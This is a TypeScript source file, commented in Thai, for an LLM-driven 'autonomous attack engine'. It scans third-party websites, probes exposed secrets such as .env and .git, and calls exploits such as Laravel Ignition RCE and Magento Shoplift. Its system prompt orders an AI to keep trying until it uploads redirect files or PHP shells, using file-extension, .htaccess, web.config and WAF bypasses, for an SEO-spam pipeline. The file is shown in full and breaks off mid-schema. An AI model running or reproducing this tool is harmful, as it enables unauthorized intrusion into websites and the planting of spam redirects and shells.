// ═══════════════════════════════════════════════════════════════
//  AI AUTONOMOUS ATTACK ENGINE v2
//  LLM เป็นผู้บัญชาการ — วิเคราะห์ target, สร้าง payload, เลือก method,
//  ปรับ strategy real-time, ลองจนกว่าจะสำเร็จ
//
//  v2 Upgrades:
//  - ใช้ AI Pre-Analysis (Phase 0) findings ตั้งแต่ iteration แรก
//  - Query DB history เพื่อดูว่า method ไหนเคยสำเร็จกับ target ประเภทเดียวกัน
//  - บันทึกทุก decision ลง DB เป็น training data
//  - รองรับทุกภาษา/platform (PHP, ASP.NET, JSP, Python, Node.js, Ruby, Go, static)
//  - รองรับทุก web server (Apache, Nginx, IIS, LiteSpeed, Caddy, Tomcat)
//  - รองรับทุก control panel (cPanel, Plesk, DirectAdmin, CyberPanel)
//  - รองรับทุก CMS (WordPress, Joomla, Drupal, Magento, PrestaShop, etc.)
//
//  Architecture: OODA Loop (Observe → Orient → Decide → Act)
// ═══════════════════════════════════════════════════════════════

import { invokeLLM } from "./_core/llm";
import { saveAttackDecision, getSuccessfulMethods } from "./db";
import type { AiTargetAnalysis } from "./ai-target-analysis";
import {
  runNonWpExploits,
  laravelIgnitionRce,
  laravelEnvExposure,
  laravelDebugLeak,
  magentoShoplift,
  magentoRestUpload,
  magentoDownloaderExposure,
  nginxAliasTraversal,
  apacheHtaccessBypass,
  serverMisconfigScan,
  phpFpmBypass,
  gitSvnExposure,
  debugEndpointScan,
  type ExploitResult,
  type NonWpScanResult,
} from "./non-wp-exploits";

// ─── Types ───

export interface ReconData {
  domain: string;
  ip: string | null;
  serverType: string | null;
  cms: string | null;
  cmsVersion: string | null;
  phpVersion: string | null;
  language: string | null;        // PHP, ASP.NET, JSP, Python, Node.js, Ruby, Go, static
  waf: string | null;
  wafStrength: string | null;
  os: string | null;
  controlPanel: string | null;    // cPanel, Plesk, DirectAdmin, CyberPanel
  hostingProvider: string | null;
  writablePaths: string[];
  exposedEndpoints: string[];
  responseHeaders: Record<string, string>;
  statusCodes: Record<string, number>;
  directoryListing: boolean;
  hasFileUpload: boolean;
  hasXmlrpc: boolean;
  hasRestApi: boolean;
  hasWebdav: boolean;
  hasFtp: boolean;
  sslEnabled: boolean;
  responseTimeMs: number;
}

export interface AiDecision {
  iteration: number;
  method: string;
  payload: string;
  filename: string;
  uploadPath: string;
  contentType: string;
  httpMethod: "POST" | "PUT" | "PATCH" | "MOVE" | "COPY" | "MKCOL" | "PROPFIND" | "DELETE";
  headers: Record<string, string>;
  reasoning: string;
  bypassTechnique: string;
  confidence: number;
  isRedirectPayload: boolean;
  payloadType: string;            // php_redirect, html_meta, js_redirect, htaccess, web_config, jsp, aspx, py, node
}

export interface ExecutionResult {
  decision: AiDecision;
  success: boolean;
  statusCode: number;
  responseBody: string;
  responseHeaders: Record<string, string>;
  error: string | null;
  fileVerified: boolean;
  redirectVerified: boolean;
  uploadedUrl: string | null;
  durationMs: number;
}

export interface AiCommanderEvent {
  type: "recon" | "decision" | "execute" | "learn" | "adapt" | "success" | "exhausted" | "error" | "history";
  iteration: number;
  maxIterations: number;
  detail: string;
  data?: any;
}

export type AiCommanderCallback = (event: AiCommanderEvent) => void;

export interface AiCommanderConfig {
  targetDomain: string;
  redirectUrl: string;
  maxIterations?: number;
  timeoutPerAttempt?: number;
  seoKeywords?: string[];
  onEvent?: AiCommanderCallback;
  // v2: Pre-Analysis data from Phase 0
  preAnalysis?: AiTargetAnalysis | null;
  // v2: User ID for DB tracking
  userId?: number;
  // v2: Pipeline type
  pipelineType?: "seo_spam" | "autonomous" | "manual";
  // v2: Session ID to group decisions
  sessionId?: string;
  // v3: PHP shell code for non-WP exploits
  phpShellCode?: string;
  // v3: Shell filename for non-WP exploits
  shellFileName?: string;
}

export interface AiCommanderResult {
  success: boolean;
  iterations: number;
  successfulMethod: string | null;
  uploadedUrl: string | null;
  redirectVerified: boolean;
  decisions: AiDecision[];
  executionResults: ExecutionResult[];
  reconData: ReconData | null;
  totalDurationMs: number;
  // v2: History-based insights
  historyInsights: HistoryInsight | null;
  // v3: Non-WP exploit results
  nonWpExploitResults: NonWpScanResult | null;
}

interface HistoryInsight {
  totalHistoricalAttempts: number;
  totalHistoricalSuccess: number;
  successRate: number;
  bestMethodsForTarget: Array<{
    method: string;
    bypassTechnique: string | null;
    payloadType: string | null;
    successCount: number;
  }>;
}

// ─── Constants ───

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
];

// Multi-platform scan paths
const SCAN_PATHS_BY_PLATFORM: Record<string, string[]> = {
  wordpress: [
    "/wp-content/uploads/", "/wp-content/themes/", "/wp-content/plugins/",
    "/wp-includes/", "/wp-content/upgrade/", "/wp-content/cache/",
    "/wp-content/uploads/2026/", "/wp-content/uploads/2025/",
  ],
  joomla: [
    "/images/", "/media/", "/tmp/", "/cache/", "/administrator/cache/",
    "/components/", "/modules/", "/plugins/", "/templates/",
  ],
  drupal: [
    "/sites/default/files/", "/sites/all/modules/", "/sites/all/themes/",
    "/files/", "/misc/", "/modules/", "/themes/",
  ],
  magento: [
    "/media/", "/var/", "/pub/media/", "/pub/static/",
    "/media/catalog/", "/media/tmp/",
  ],
  generic: [
    "/uploads/", "/images/", "/media/", "/assets/", "/files/",
    "/tmp/", "/cache/", "/public/uploads/", "/content/images/",
    "/data/", "/backup/", "/temp/", "/static/", "/resources/",
    "/img/", "/pics/", "/documents/", "/download/", "/storage/",
  ],
  aspnet: [
    "/App_Data/", "/Content/", "/Scripts/", "/uploads/",
    "/images/", "/media/", "/files/", "/temp/",
  ],
  iis: [
    "/inetpub/", "/uploads/", "/images/", "/content/",
    "/aspnet_client/", "/App_Data/",
  ],
  cpanel: [
    "/public_html/", "/public_html/uploads/", "/public_html/images/",
    "/public_html/wp-content/uploads/", "/public_html/media/",
  ],
  tomcat: [
    "/ROOT/", "/webapps/", "/uploads/", "/images/",
    "/WEB-INF/", "/META-INF/",
  ],
  nginx: [
    "/uploads/", "/images/", "/media/", "/static/",
    "/public/", "/assets/", "/files/",
  ],
};

const VULN_PATHS = [
  // WordPress
  "/wp-admin/admin-ajax.php", "/xmlrpc.php", "/wp-json/wp/v2/",
  "/wp-login.php", "/readme.html", "/wp-admin/install.php",
  "/wp-admin/setup-config.php", "/wp-content/debug.log",
  // Generic
  "/.env", "/phpinfo.php", "/.git/HEAD", "/server-status",
  "/info.php", "/test.php", "/.htaccess", "/web.config",
  // Joomla
  "/administrator/", "/configuration.php-dist",
  // Drupal
  "/user/login", "/CHANGELOG.txt",
  // ASP.NET
  "/elmah.axd", "/trace.axd", "/web.config",
  // Node.js
  "/package.json", "/.env.local",
  // Python
  "/admin/", "/settings.py",
  // WebDAV
  "/webdav/", "/dav/",
  // Control panels
  "/cpanel", "/plesk", "/directadmin",
];

function randomStr(len: number): string {
  return Array.from({ length: len }, () => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * 36)]).join("");
}

function randomUA(): string {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

// ─── Phase 0: LOAD HISTORY — ดึง training data จาก DB ───

async function loadHistoryInsights(
  recon: ReconData,
  onEvent?: AiCommanderCallback,
): Promise<HistoryInsight> {
  onEvent?.({
    type: "history", iteration: 0, maxIterations: 0,
    detail: "📊 กำลังค้นหา historical data — method ไหนเคยสำเร็จกับ target ประเภทนี้...",
  });

  try {
    const successfulMethods = await getSuccessfulMethods({
      serverType: recon.serverType,
      cms: recon.cms,
      language: recon.language,
      waf: recon.waf,
      limit: 20,
    });

    const totalSuccess = successfulMethods.reduce((sum, m) => sum + m.successCount, 0);

    // Also get broader results (just by server type)
    const broaderMethods = recon.serverType
      ? await getSuccessfulMethods({ serverType: recon.serverType, limit: 10 })
      : [];

    const allMethods = [...successfulMethods, ...broaderMethods];
    const uniqueMethods = Array.from(
      new Map(allMethods.map(m => [`${m.method}|${m.bypassTechnique}`, m])).values()
    );

    const insight: HistoryInsight = {
      totalHistoricalAttempts: totalSuccess * 3, // rough estimate
      totalHistoricalSuccess: totalSuccess,
      successRate: totalSuccess > 0 ? Math.round((totalSuccess / (totalSuccess * 3)) * 100) : 0,
      bestMethodsForTarget: uniqueMethods.map(m => ({
        method: m.method,
        bypassTechnique: m.bypassTechnique,
        payloadType: m.payloadType,
        successCount: m.successCount,
      })),
    };

    if (insight.bestMethodsForTarget.length > 0) {
      onEvent?.({
        type: "history", iteration: 0, maxIterations: 0,
        detail: `📊 พบ ${insight.bestMethodsForTarget.length} methods ที่เคยสำเร็จกับ ${recon.serverType || "unknown"} + ${recon.cms || "unknown CMS"}: ${insight.bestMethodsForTarget.slice(0, 3).map(m => `${m.method}(${m.successCount}x)`).join(", ")}`,
        data: insight,
      });
    } else {
      onEvent?.({
        type: "history", iteration: 0, maxIterations: 0,
        detail: "📊 ไม่พบ historical data สำหรับ target ประเภทนี้ — AI จะใช้ knowledge base เริ่มต้น",
      });
    }

    return insight;
  } catch (e: any) {
    onEvent?.({
      type: "history", iteration: 0, maxIterations: 0,
      detail: `⚠️ ไม่สามารถดึง historical data: ${e.message}`,
    });
    return { totalHistoricalAttempts: 0, totalHistoricalSuccess: 0, successRate: 0, bestMethodsForTarget: [] };
  }
}

// ─── Phase 1: RECON (enhanced with Pre-Analysis data) ───

async function performRecon(
  domain: string,
  preAnalysis?: AiTargetAnalysis | null,
  onEvent?: AiCommanderCallback,
): Promise<ReconData> {
  const targetUrl = domain.startsWith("http") ? domain.replace(/\/+$/, "") : `http://${domain}`;

  const recon: ReconData = {
    domain,
    ip: null,
    serverType: null,
    cms: null,
    cmsVersion: null,
    phpVersion: null,
    language: null,
    waf: null,
    wafStrength: null,
    os: null,
    controlPanel: null,
    hostingProvider: null,
    writablePaths: [],
    exposedEndpoints: [],
    responseHeaders: {},
    statusCodes: {},
    directoryListing: false,
    hasFileUpload: false,
    hasXmlrpc: false,
    hasRestApi: false,
    hasWebdav: false,
    hasFtp: false,
    sslEnabled: domain.includes("https") || true,
    responseTimeMs: 0,
  };

  // ─── Merge Pre-Analysis data if available ───
  if (preAnalysis) {
    onEvent?.({ type: "recon", iteration: 0, maxIterations: 0, detail: "🧠 ใช้ข้อมูลจาก AI Pre-Analysis (Phase 0) เพื่อเร่ง recon..." });

    recon.ip = preAnalysis.dnsInfo.ipAddress;
    recon.serverType = preAnalysis.httpFingerprint.serverType;
    recon.phpVersion = preAnalysis.httpFingerprint.phpVersion;
    recon.os = preAnalysis.httpFingerprint.osGuess;
    recon.cms = preAnalysis.techStack.cms;
    recon.cmsVersion = preAnalysis.techStack.cmsVersion;
    recon.waf = preAnalysis.security.wafDetected;
    recon.wafStrength = preAnalysis.security.wafStrength;
    recon.hostingProvider = preAnalysis.dnsInfo.hostingProvider;
    recon.sslEnabled = preAnalysis.security.sslEnabled;
    recon.responseTimeMs = preAnalysis.httpFingerprint.responseTime;

    // Detect language from tech stack
    if (preAnalysis.httpFingerprint.phpVersion || preAnalysis.techStack.cms === "WordPress" || preAnalysis.techStack.cms === "Joomla" || preAnalysis.techStack.cms === "Drupal") {
      recon.language = "PHP";
    } else if (preAnalysis.httpFingerprint.poweredBy?.includes("ASP.NET") || preAnalysis.httpFingerprint.serverType === "IIS") {
      recon.language = "ASP.NET";
    } else if (preAnalysis.techStack.framework?.includes("Express") || preAnalysis.techStack.framework?.includes("Next") || preAnalysis.techStack.framework?.includes("Nuxt")) {
      recon.language = "Node.js";
    } else if (preAnalysis.techStack.framework?.includes("Django") || preAnalysis.techStack.framework?.includes("Flask")) {
      recon.language = "Python";
    } else if (preAnalysis.techStack.framework?.includes("Rails")) {
      recon.language = "Ruby";
    } else if (preAnalysis.httpFingerprint.serverType === "Tomcat" || preAnalysis.techStack.framework?.includes("Spring")) {
      recon.language = "JSP";
    }

    // Upload surface from pre-analysis
    if (preAnalysis.uploadSurface) {
      recon.writablePaths = [...preAnalysis.uploadSurface.writablePaths];
      recon.exposedEndpoints = [...preAnalysis.uploadSurface.uploadEndpoints];
      recon.hasXmlrpc = preAnalysis.uploadSurface.xmlrpcAvailable;
      recon.hasRestApi = preAnalysis.uploadSurface.restApiAvailable;
      recon.hasWebdav = preAnalysis.uploadSurface.webdavAvailable;
      recon.hasFtp = preAnalysis.uploadSurface.ftpAvailable;
      recon.hasFileUpload = preAnalysis.uploadSurface.fileManagerDetected;
      recon.directoryListing = preAnalysis.uploadSurface.directoryListingPaths.length > 0;
    }

    onEvent?.({
      type: "recon", iteration: 0, maxIterations: 0,
      detail: `✅ Pre-Analysis data merged: ${recon.serverType || "Unknown"} / ${recon.language || "Unknown"} / ${recon.cms || "No CMS"} / WAF: ${recon.waf || "None"} (${recon.wafStrength || "n/a"})`,
      data: recon,
    });
  }

  // ─── Live scan (always do this even with pre-analysis) ───
  onEvent?.({ type: "recon", iteration: 0, maxIterations: 0, detail: "🔍 สแกนหน้าหลัก — fingerprint server..." });
  try {
    const start = Date.now();
    const ctrl = new AbortController();
    setTimeout(() => ctrl.abort(), 10000);
    const resp = await fetch(targetUrl, {
      headers: { "User-Agent": randomUA() },
      signal: ctrl.signal,
      redirect: "follow",
    });
    if (!preAnalysis) recon.responseTimeMs = Date.now() - start;

    const server = resp.headers.get("server") || "";
    const poweredBy = resp.headers.get("x-powered-by") || "";

    // Server detection (only override if not from pre-analysis)
    if (!recon.serverType) {
      if (server.toLowerCase().includes("apache")) recon.serverType = "Apache";
      else if (server.toLowerCase().includes("nginx")) recon.serverType = "Nginx";
      else if (server.toLowerCase().includes("iis")) recon.serverType = "IIS";
      else if (server.toLowerCase().includes("litespeed")) recon.serverType = "LiteSpeed";
      else if (server.toLowerCase().includes("caddy")) recon.serverType = "Caddy";
      else if (server.toLowerCase().includes("tomcat")) recon.serverType = "Tomcat";
      else if (server.toLowerCase().includes("cloudflare")) recon.serverType = "Cloudflare";
      else if (server.toLowerCase().includes("openresty")) recon.serverType = "OpenResty";
      else if (server) recon.serverType = server;
    }

    // Language detection
    if (!recon.language) {
      if (poweredBy.includes("PHP")) recon.language = "PHP";
      else if (poweredBy.includes("ASP.NET")) recon.language = "ASP.NET";
      else if (poweredBy.includes("Express")) recon.language = "Node.js";
      else if (poweredBy.includes("Servlet") || poweredBy.includes("JSP")) recon.language = "JSP";
      else if (resp.headers.get("x-aspnet-version")) recon.language = "ASP.NET";
      else if (resp.headers.get("x-aspnetmvc-version")) recon.language = "ASP.NET";
    }

    if (!recon.phpVersion && poweredBy.includes("PHP")) {
      const m = poweredBy.match(/PHP\/([\d.]+)/);
      if (m) recon.phpVersion = m[1];
    }

    // WAF detection
    if (!recon.waf) {
      if (resp.headers.get("cf-ray")) recon.waf = "Cloudflare";
      else if (resp.headers.get("x-sucuri-id")) recon.waf = "Sucuri";
      else if (resp.headers.get("x-cdn")) recon.waf = "CDN/WAF";
      else if (server.toLowerCase().includes("cloudflare")) recon.waf = "Cloudflare";
      else if (resp.headers.get("x-fw-protection")) recon.waf = "Wordfence";
    }

    // OS guess
    if (!recon.os) {
      if (server.toLowerCase().includes("win") || server.toLowerCase().includes("iis")) recon.os = "Windows";
      else recon.os = "Linux";
    }

    // Control panel detection
    if (!recon.controlPanel) {
      if (resp.headers.get("x-powered-by-plesk")) recon.controlPanel = "Plesk";
    }

    resp.headers.forEach((v, k) => { recon.responseHeaders[k] = v; });

    // CMS detection from body
    const body = await resp.text().catch(() => "");
    if (!recon.cms) {
      if (body.includes("wp-content") || body.includes("wp-includes")) recon.cms = "WordPress";
      else if (body.includes("Joomla")) recon.cms = "Joomla";
      else if (body.includes("Drupal")) recon.cms = "Drupal";
      else if (body.includes("Magento") || body.includes("magento")) recon.cms = "Magento";
      else if (body.includes("PrestaShop") || body.includes("prestashop")) recon.cms = "PrestaShop";
      else if (body.includes("OpenCart") || body.includes("opencart")) recon.cms = "OpenCart";
      else if (body.includes("Shopify")) recon.cms = "Shopify";
      else if (body.includes("Wix")) recon.cms = "Wix";
      else if (body.includes("Squarespace")) recon.cms = "Squarespace";
    }

    // Language detection from body
    if (!recon.language) {
      if (body.includes(".php") || body.includes("wp-content")) recon.language = "PHP";
      else if (body.includes(".aspx") || body.includes("__VIEWSTATE")) recon.language = "ASP.NET";
      else if (body.includes(".jsp")) recon.language = "JSP";
      else if (body.includes("_next/") || body.includes("__next")) recon.language = "Node.js";
      else if (body.includes("django") || body.includes("csrfmiddlewaretoken")) recon.language = "Python";
    }

    // Version detection
    if (!recon.cmsVersion && recon.cms === "WordPress") {
      const verMatch = body.match(/content="WordPress\s+([\d.]+)"/i) || body.match(/ver=([\d.]+)/);
      if (verMatch) recon.cmsVersion = verMatch[1];
    }
  } catch (e: any) {
    onEvent?.({ type: "recon", iteration: 0, maxIterations: 0, detail: `⚠️ Main page scan failed: ${e.message}` });
  }

  // ─── Platform-specific path scanning ───
  const platformPaths = getScanPaths(recon);
  onEvent?.({ type: "recon", iteration: 0, maxIterations: 0, detail: `🔍 สแกน ${platformPaths.length} paths สำหรับ ${recon.language || "unknown"} / ${recon.cms || "generic"}...` });

  await Promise.allSettled(
    platformPaths.map(async (path) => {
      try {
        const ctrl = new AbortController();
        setTimeout(() => ctrl.abort(), 8000);
        const resp = await fetch(`${targetUrl}${path}`, {
          method: "HEAD",
          headers: { "User-Agent": randomUA() },
          signal: ctrl.signal,
          redirect: "follow",
        });
        recon.statusCodes[path] = resp.status;
        if (resp.status < 400 && !recon.writablePaths.includes(path)) {
          recon.writablePaths.push(path);
          const ct = resp.headers.get("content-type") || "";
          if (ct.includes("html") && resp.status === 200) recon.directoryListing = true;
        }
      } catch { recon.statusCodes[path] = 0; }
    })
  );

  // ─── Vuln endpoint scanning ───
  onEvent?.({ type: "recon", iteration: 0, maxIterations: 0, detail: `🔍 สแกน ${VULN_PATHS.length} vulnerability endpoints...` });
  await Promise.allSettled(
    VULN_PATHS.map(async (path) => {
      try {
        const ctrl = new AbortController();
        setTimeout(() => ctrl.abort(), 8000);
        const resp = await fetch(`${targetUrl}${path}`, {
          headers: { "User-Agent": randomUA() },
          signal: ctrl.signal,
          redirect: "follow",
        });
        if (resp.status === 200 && !recon.exposedEndpoints.includes(path)) {
          recon.exposedEndpoints.push(path);
          if (path === "/xmlrpc.php") recon.hasXmlrpc = true;
          if (path.includes("wp-json")) recon.hasRestApi = true;
          if (path === "/wp-login.php") { recon.cms = recon.cms || "WordPress"; recon.language = recon.language || "PHP"; }
          if (path.includes("webdav") || path.includes("dav")) recon.hasWebdav = true;
        }
      } catch {}
    })
  );

  // WebDAV check
  if (!recon.hasWebdav) {
    try {
      const ctrl = new AbortController();
      setTimeout(() => ctrl.abort(), 5000);
      const resp = await fetch(targetUrl, { method: "OPTIONS", headers: { "User-Agent": randomUA() }, signal: ctrl.signal });
      const allow = resp.headers.get("allow") || "";
      if (allow.includes("PUT") || allow.includes("MKCOL") || allow.includes("PROPFIND")) {
        recon.hasWebdav = true;
      }
    } catch {}
  }

  recon.hasFileUpload = recon.writablePaths.some(p => p.includes("upload"));

  onEvent?.({
    type: "recon", iteration: 0, maxIterations: 0,
    detail: `✅ Recon เสร็จ: ${recon.serverType || "Unknown"} / ${recon.language || "Unknown lang"} / ${recon.cms || "No CMS"} / WAF: ${recon.waf || "None"} / ${recon.writablePaths.length} writable paths / ${recon.exposedEndpoints.length} exposed / WebDAV: ${recon.hasWebdav}`,
    data: recon,
  });

  return recon;
}

function getScanPaths(recon: ReconData): string[] {
  const paths = new Set<string>();

  // Always add generic paths
  SCAN_PATHS_BY_PLATFORM.generic.forEach(p => paths.add(p));

  // Add CMS-specific paths
  if (recon.cms === "WordPress") SCAN_PATHS_BY_PLATFORM.wordpress.forEach(p => paths.add(p));
  if (recon.cms === "Joomla") SCAN_PATHS_BY_PLATFORM.joomla.forEach(p => paths.add(p));
  if (recon.cms === "Drupal") SCAN_PATHS_BY_PLATFORM.drupal.forEach(p => paths.add(p));
  if (recon.cms === "Magento") SCAN_PATHS_BY_PLATFORM.magento.forEach(p => paths.add(p));

  // Add server-specific paths
  if (recon.language === "ASP.NET" || recon.serverType === "IIS") SCAN_PATHS_BY_PLATFORM.aspnet.forEach(p => paths.add(p));
  if (recon.serverType === "IIS") SCAN_PATHS_BY_PLATFORM.iis.forEach(p => paths.add(p));
  if (recon.serverType === "Tomcat" || recon.language === "JSP") SCAN_PATHS_BY_PLATFORM.tomcat.forEach(p => paths.add(p));
  if (recon.serverType === "Nginx") SCAN_PATHS_BY_PLATFORM.nginx.forEach(p => paths.add(p));

  // Add control panel paths
  if (recon.controlPanel === "cPanel" || recon.hostingProvider?.toLowerCase().includes("cpanel")) {
    SCAN_PATHS_BY_PLATFORM.cpanel.forEach(p => paths.add(p));
  }

  return Array.from(paths);
}

// ─── Phase 2: AI DECISION — LLM เลือก attack method + สร้าง payload ───

async function aiDecide(
  recon: ReconData,
  redirectUrl: string,
  iteration: number,
  previousResults: ExecutionResult[],
  seoKeywords: string[],
  historyInsights: HistoryInsight | null,
  preAnalysis: AiTargetAnalysis | null | undefined,
  onEvent?: AiCommanderCallback,
  maxIterations: number = 10,
  nonWpFindings?: ExploitResult[],
): Promise<AiDecision> {
  onEvent?.({
    type: "decision", iteration, maxIterations,
    detail: `🧠 AI กำลังวิเคราะห์และตัดสินใจ attack method... (iteration ${iteration}/${maxIterations})`,
  });

  // Build history of what failed and why
  const failHistory = previousResults.map((r, i) => ({
    iteration: i + 1,
    method: r.decision.method,
    filename: r.decision.filename,
    path: r.decision.uploadPath,
    statusCode: r.statusCode,
    error: r.error,
    responseSnippet: r.responseBody.slice(0, 300),
    bypassTechnique: r.decision.bypassTechnique,
    payloadType: r.decision.payloadType,
  }));

  // Build historical success data
  const historyData = historyInsights?.bestMethodsForTarget.length
    ? `\n\nHISTORICAL SUCCESS DATA (methods that worked on similar targets):\n${historyInsights.bestMethodsForTarget.map(m => `- ${m.method} (${m.bypassTechnique || "standard"}, payload: ${m.payloadType || "unknown"}) — succeeded ${m.successCount} times`).join("\n")}\nPRIORITIZE these methods first as they have proven success on similar server/CMS/WAF combinations.`
    : "";

  // Build pre-analysis strategic recommendations
  const preAnalysisData = preAnalysis?.aiStrategy
    ? `\n\nAI PRE-ANALYSIS STRATEGIC RECOMMENDATIONS:
Success Probability: ${preAnalysis.aiStrategy.overallSuccessProbability}%
Difficulty: ${preAnalysis.aiStrategy.difficulty}
Best Approach: ${preAnalysis.aiStrategy.bestApproach}
Tactical Analysis: ${preAnalysis.aiStrategy.tacticalAnalysis}
Recommended Methods (by priority):
${preAnalysis.aiStrategy.recommendedMethods.map(m => `  ${m.priority}. ${m.method} (${m.probability}% success) — ${m.reasoning}`).join("\n")}
Warnings: ${preAnalysis.aiStrategy.warnings.join("; ")}
USE THESE RECOMMENDATIONS to guide your first few iterations.`
    : "";

  // Build non-WP exploit findings context
  const nonWpData = nonWpFindings && nonWpFindings.length > 0
    ? `\n\nNON-WP EXPLOIT SCAN FINDINGS (from Phase 0.5):\n${nonWpFindings.map(f => `- ${f.method} (${f.severity}): ${f.details}${f.cve ? ` [${f.cve}]` : ""}${f.evidence ? ` Evidence: ${f.evidence.slice(0, 100)}` : ""}`).join("\n")}\nUSE THESE FINDINGS to guide your attack strategy. Exploit discovered vulnerabilities first.`
    : "";

  const systemPrompt = `You are an elite offensive security AI commander. Your SOLE MISSION is to successfully upload a redirect file to the target server. You MUST succeed.

You have DEEP expertise in ALL web platforms and languages:

PHP PLATFORMS (WordPress, Joomla, Drupal, Magento, PrestaShop, OpenCart, custom):
- Shell upload bypass: double extension (.php.jpg), null byte (.php%00.jpg), .phtml/.pht/.php5/.php7/.phar
- .htaccess injection: AddType application/x-httpd-php .jpg → upload "image.jpg" containing PHP
- WordPress: plugin upload, theme editor, XMLRPC wp.uploadFile, REST API /wp-json/wp/v2/media, admin-ajax
- Joomla: media manager, com_media upload, template editor
- Drupal: file upload fields, RESTful Web Services, JSON:API
- Magento: admin media gallery, WYSIWYG editor upload

ASP.NET / IIS PLATFORMS:
- web.config injection: <handlers> to map .jpg → aspx handler
- .aspx/.ashx/.asmx file upload
- IIS semicolon bypass: file.aspx;.jpg
- IIS tilde (~) enumeration for short filenames
- ADS (Alternate Data Streams): file.aspx::$DATA
- PUT method often enabled on IIS/WebDAV
- .asp classic: <% Response.Redirect "url" %>

JSP / TOMCAT / JAVA:
- .jsp/.jspx file upload
- WAR file deployment via /manager/deploy
- Tomcat PUT method (often enabled)
- Spring Boot actuator endpoints
- .xml configuration injection

PYTHON (Django, Flask, FastAPI):
- Template injection via uploaded .html files
- Static file serving bypass
- Debug mode exploitation
- Admin panel file upload

NODE.JS (Express, Next.js, Nuxt):
- Static file serving directory traversal
- File upload middleware bypass
- .ejs/.pug template injection

RUBY (Rails):
- Public directory file upload
- ERB template injection
- Paperclip/CarrierWave/ActiveStorage bypass

GO:
- Static file serving
- Template injection

STATIC SITES (Nginx, Apache, Caddy, LiteSpeed):
- Direct PUT/MKCOL if WebDAV enabled
- .htaccess for Apache (AddHandler, RewriteRule)
- Nginx alias misconfiguration
- LiteSpeed .htaccess compatibility

UNIVERSAL METHODS (work on ANY platform):
- HTML file with meta refresh + JavaScript redirect (NO server-side execution needed)
- SVG file with embedded JavaScript
- .htaccess RewriteRule redirect (Apache/LiteSpeed only)
- web.config redirect (IIS only)
- WebDAV PUT/MKCOL/COPY/MOVE
- FTP/SFTP if credentials found

CRITICAL RULES:
1. NEVER repeat a method+path+filename combination that already failed
2. Each iteration MUST try something COMPLETELY DIFFERENT
3. Analyze previous failures to understand WHY they failed
4. If PHP doesn't work → try HTML-only payload (works on ANY server)
5. If POST doesn't work → try PUT, PATCH, MOVE, COPY
6. If one path is blocked → try ALL other paths
7. Match payload type to detected language: PHP→.php, ASP.NET→.aspx, JSP→.jsp, etc.
8. If server language is unknown → use HTML/JS redirect (universal)
9. ALWAYS generate REAL working payload code with actual redirect
10. Prefer polyglot payloads that work as both server-side AND client-side redirect
11. For WAF bypass: try chunked encoding, unicode normalization, boundary manipulation
12. For strong WAF: use HTML-only payload (WAFs rarely block HTML files)

ตอบเป็น JSON เท่านั้น ไม่ต้องอธิบายเพิ่ม`;

  const userPrompt = `TARGET ANALYSIS:
Domain: ${recon.domain}
Server: ${recon.serverType || "Unknown"}
Language: ${recon.language || "Unknown"}
CMS: ${recon.cms || "None"} ${recon.cmsVersion ? `v${recon.cmsVersion}` : ""}
PHP: ${recon.phpVersion || "N/A"}
WAF: ${recon.waf || "None"} (Strength: ${recon.wafStrength || "unknown"})
OS: ${recon.os || "Unknown"}
Control Panel: ${recon.controlPanel || "Unknown"}
Hosting: ${recon.hostingProvider || "Unknown"}
Writable Paths: ${recon.writablePaths.length > 0 ? recon.writablePaths.join(", ") : "None found"}
Exposed Endpoints: ${recon.exposedEndpoints.length > 0 ? recon.exposedEndpoints.join(", ") : "None"}
Has File Upload: ${recon.hasFileUpload}
Has XMLRPC: ${recon.hasXmlrpc}
Has REST API: ${recon.hasRestApi}
Has WebDAV: ${recon.hasWebdav}
Has FTP: ${recon.hasFtp}
Directory Listing: ${recon.directoryListing}
Response Time: ${recon.responseTimeMs}ms
${historyData}
${preAnalysisData}
${nonWpData}

REDIRECT TARGET: ${redirectUrl}
SEO KEYWORDS: ${seoKeywords.length > 0 ? seoKeywords.join(", ") : "none"}

ITERATION: ${iteration}/${maxIterations}

${failHistory.length > 0 ? `PREVIOUS FAILED ATTEMPTS (DO NOT REPEAT):
${failHistory.map(f => `- Iter ${f.iteration}: ${f.method} → ${f.path}${f.filename} (${f.bypassTechnique}, ${f.payloadType}): HTTP ${f.statusCode}${f.error ? ` (${f.error})` : ""}${f.responseSnippet ? ` Response: "${f.responseSnippet.slice(0, 150)}"` : ""}`).join("\n")}

Based on these failures, choose a COMPLETELY DIFFERENT approach.` : "This is the FIRST attempt. Choose the method most likely to succeed based on the target profile."}

AVAILABLE METHODS: multipart_upload, put_direct, post_raw, wp_media_upload, wp_rest_media, xmlrpc_upload, webdav_put, webdav_mkcol, move_method, copy_method, patch_append, htaccess_inject, webconfig_inject, tomcat_put, options_probe

AVAILABLE PAYLOAD TYPES: php_redirect, html_meta, js_redirect, htaccess_rewrite, web_config_redirect, jsp_redirect, aspx_redirect, asp_classic_redirect, python_redirect, svg_redirect, polyglot_php_html

Generate JSON:
{
  "method": "method name",
  "payload": "COMPLETE file content with working redirect to ${redirectUrl}",
  "filename": "filename with bypass technique",
  "uploadPath": "target path",
  "contentType": "Content-Type header",
  "httpMethod": "POST/PUT/PATCH/MOVE/COPY/MKCOL/PROPFIND",
  "headers": {},
  "reasoning": "why this will work (Thai)",
  "bypassTechnique": "technique name",
  "confidence": 0-100,
  "isRedirectPayload": true,
  "payloadType": "payload type from list above"
}`;

  try {
    const response = await invokeLLM({
      messages: [
        { role: "system", content: systemPrompt },
        { role: "user", content: userPrompt },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "attack_decision",
          strict: true,
          schema: {
            type: "object",
            properties: {
              method: { type: "string" },
              payload: { type: "string" },
              filename: { type: "string" },
              uploadPath: { type: "string" },
              contentType: { type: "string" },
              httpMethod: { type: "string" },
              headers: { type: "object", additionalProperties: { type: "string" } },
